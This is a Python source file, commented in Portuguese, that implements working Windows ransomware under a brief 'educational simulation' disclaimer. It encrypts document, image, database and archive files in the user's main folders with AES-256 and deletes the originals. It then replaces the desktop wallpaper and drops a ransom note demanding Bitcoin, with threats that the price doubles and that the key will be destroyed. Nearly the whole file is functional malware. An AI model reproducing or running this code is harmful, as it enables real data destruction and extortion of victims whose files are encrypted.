#!/usr/bin/env python3
import os
import sys
import json
import base64
import socket
import threading
import time
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import hashlib
import win32api
import win32con
import win32gui

# ===== CONFIGURAÇÕES ===== #
VICTIM_ID = str(hashlib.sha256(socket.gethostname().encode()).hexdigest()[:16])
PAYMENT_BTC_ADDRESS = "1YourBitcoinAddressHere"  # Exemplo
RANSOM_AMOUNT = 0.1  # BTC
CONTACT_EMAIL = "recover@example.com"
MAX_FILE_SIZE = 10485760  # 10MB (evita arquivos grandes)
EXTENSIONS_TO_ENCRYPT = [
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.pdf', '.jpg', '.png', '.sql', '.db', '.mdb', '.csv',
    '.psd', '.ai', '.cdr', '.dwg', '.zip', '.rar', '.7z'
]

# ===== CONSTANTES ===== #
AES_KEY_SIZE = 32  # 256 bits
RSA_KEY_SIZE = 2048
SIGNATURE = b"===RANSOMWARE_SIGNATURE==="

class Ransomware:
    def __init__(self):
        self.encrypted_files = []
        self.aes_key = get_random_bytes(AES_KEY_SIZE)
        self.rsa_key = self._generate_rsa_keys()
        self.wallpaper_path = os.path.join(os.getenv('TEMP'), 'ransom_wallpaper.bmp')
        self.readme_path = os.path.join(os.getenv('USERPROFILE'), 'Desktop', 'READ_ME.txt')

    def _generate_rsa_keys(self):
        """Gera par de chaves RSA (pública/privada)"""
        key = RSA.generate(RSA_KEY_SIZE)
        return {
            'private': key.export_key(),
            'public': key.publickey().export_key()
        }

    def _encrypt_aes_key(self):
        """Criptografa a chave AES com RSA"""
        cipher_rsa = PKCS1_OAEP.new(RSA.import_key(self.rsa_key['public']))
        return cipher_rsa.encrypt(self.aes_key)

    def _decrypt_aes_key(self, encrypted_key):
        """Descriptografa a chave AES com RSA (para fins de teste)"""
        cipher_rsa = PKCS1_OAEP.new(RSA.import_key(self.rsa_key['private']))
        return cipher_rsa.decrypt(encrypted_key)

    def _encrypt_file(self, file_path):
        """Criptografa um arquivo com AES-256-CBC"""
        try:
            if os.path.getsize(file_path) > MAX_FILE_SIZE:
                return False

            with open(file_path, 'rb') as f:
                file_data = f.read()

            cipher_aes = AES.new(self.aes_key, AES.MODE_CBC)
            ct_bytes = cipher_aes.encrypt(pad(file_data, AES.block_size))
            
            encrypted_data = SIGNATURE + cipher_aes.iv + ct_bytes

            with open(file_path + '.encrypted', 'wb') as f:
                f.write(encrypted_data)

            os.remove(file_path)
            self.encrypted_files.append(file_path)
            return True
        except Exception as e:
            print(f"[!] Erro ao criptografar {file_path}: {e}")
            return False

    def _decrypt_file(self, file_path, aes_key):
        """Descriptografa um arquivo (para fins de teste)"""
        try:
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()

            if not encrypted_data.startswith(SIGNATURE):
                return False

            iv = encrypted_data[len(SIGNATURE):len(SIGNATURE)+16]
            ct = encrypted_data[len(SIGNATURE)+16:]

            cipher_aes = AES.new(aes_key, AES.MODE_CBC, iv=iv)
            pt = unpad(cipher_aes.decrypt(ct), AES.block_size)

            original_path = file_path.replace('.encrypted', '')
            with open(original_path, 'wb') as f:
                f.write(pt)

            os.remove(file_path)
            return True
        except Exception as e:
            print(f"[!] Erro ao descriptografar {file_path}: {e}")
            return False

    def _set_wallpaper(self):
        """Altera o papel de parede para uma mensagem de resgate"""
        try:
            from PIL import Image, ImageDraw, ImageFont
            # Cria uma imagem com a mensagem de resgate
            img = Image.new('RGB', (1920, 1080), color='black')
            draw = ImageDraw.Draw(img)
            
            try:
                font = ImageFont.truetype("arial.ttf", 40)
            except:
                font = ImageFont.load_default()
            
            message = (
                "SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!\n\n"
                f"ID DA VÍTIMA: {VICTIM_ID}\n"
                f"PAGUE {RANSOM_AMOUNT} BTC PARA: {PAYMENT_BTC_ADDRESS}\n"
                f"E ENVIE UM E-MAIL PARA: {CONTACT_EMAIL}\n"
                "COM SEU ID PARA RECEBER A CHAVE DE DESCRIPTOGRAFIA."
            )
            
            draw.text((100, 100), message, fill="red", font=font)
            img.save(self.wallpaper_path, 'BMP')
            
            # Aplica como papel de parede (Windows)
            win32gui.SystemParametersInfo(
                win32con.SPI_SETDESKWALLPAPER,
                0,
                self.wallpaper_path,
                win32con.SPIF_UPDATEINIFILE
            )
        except Exception as e:
            print(f"[!] Erro ao definir papel de parede: {e}")

    def _create_readme(self):
        """Cria um arquivo README.txt na área de trabalho"""
        message = f"""
        >>> SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! <<<

        O QUE ACONTECEU?
        - Todos os seus arquivos importantes foram criptografados.
        - Você não pode acessá-los sem a chave de descriptografia.

        COMO RECUPERAR SEUS ARQUIVOS?
        1. Envie {RANSOM_AMOUNT} BTC para: {PAYMENT_BTC_ADDRESS}
        2. Envie um e-mail para {CONTACT_EMAIL} com:
           - Seu ID: {VICTIM_ID}
           - Comprovante de pagamento
        3. Você receberá a chave de descriptografia.

        AVISO:
        - Não tente descriptografar manualmente (pode corromper os arquivos).
        - O preço dobrará após 72 horas.
        - Após 7 dias, a chave será destruída permanentemente.
        """
        try:
            with open(self.readme_path, 'w', encoding='utf-8') as f:
                f.write(message)
        except Exception as e:
            print(f"[!] Erro ao criar README.txt: {e}")

    def _encrypt_files_in_dir(self, directory):
        """Percorre diretórios e criptografa arquivos"""
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if any(file_path.endswith(ext) for ext in EXTENSIONS_TO_ENCRYPT):
                    self._encrypt_file(file_path)

    def run_ransomware(self):
        """Executa o ransomware"""
        try:
            print("[*] Iniciando criptografia de arquivos...")
            
            # Criptografa arquivos em diretórios comuns
            directories_to_encrypt = [
                os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
                os.path.join(os.getenv('USERPROFILE'), 'Documents'),
                os.path.join(os.getenv('USERPROFILE'), 'Pictures'),
                os.path.join(os.getenv('USERPROFILE'), 'Videos'),
                os.path.join(os.getenv('USERPROFILE'), 'Downloads'),
            ]
            
            for directory in directories_to_encrypt:
                if os.path.exists(directory):
                    self._encrypt_files_in_dir(directory)
            
            # Salva a chave AES criptografada (para simulação)
            encrypted_aes_key = self._encrypt_aes_key()
            key_file = os.path.join(os.getenv('TEMP'), f'{VICTIM_ID}_key.bin')
            with open(key_file, 'wb') as f:
                f.write(encrypted_aes_key)
            
            # Configura mensagem de resgate
            self._set_wallpaper()
            self._create_readme()
            
            print("[+] Criptografia concluída. Mensagem de resgate exibida.")
            print(f"[!] Chave AES criptografada salva em: {key_file}")
            
        except Exception as e:
            print(f"[!] Erro durante execução: {e}")

if __name__ == "__main__":
    print("""
    ⚠️ AVISO LEGAL:
    Este é um ransomware simulado para fins educacionais.
    Não use em sistemas sem permissão explícita.
    """)
    
    input("Pressione Enter para continuar (ou Ctrl+C para sair)...")
    
    ransomware = Ransomware()
    ransomware.run_ransomware()
